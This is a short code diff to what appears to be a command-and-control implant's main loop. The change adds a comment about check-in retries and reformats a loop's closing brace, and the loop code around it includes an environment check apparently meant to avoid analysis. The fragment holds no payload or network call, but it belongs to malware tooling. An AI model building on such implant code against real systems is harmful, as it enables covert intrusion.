@@ -11,6 +11,7 @@ namespace Implant {
                 continue;
             }
 
+            // checkin might have failed first try but message data is still in the queue
             if (!Ctx->Session.Checkin && !Ctx->Transport.OutboundQueue) {
                 Opsec::SeCheckEnvironment();
                 if (ntstatus == ERROR_BAD_ENVIRONMENT) {
@@ -28,7 +29,8 @@ namespace Implant {
             } else {
                 Ctx->Session.Retry = 0;
             }
-        } while (ntstatus != ERROR_EXIT);
+        }
+        while (ntstatus != ERROR_EXIT);
 
     defer:
         Memory::Context::ContextDestroy(Ctx);
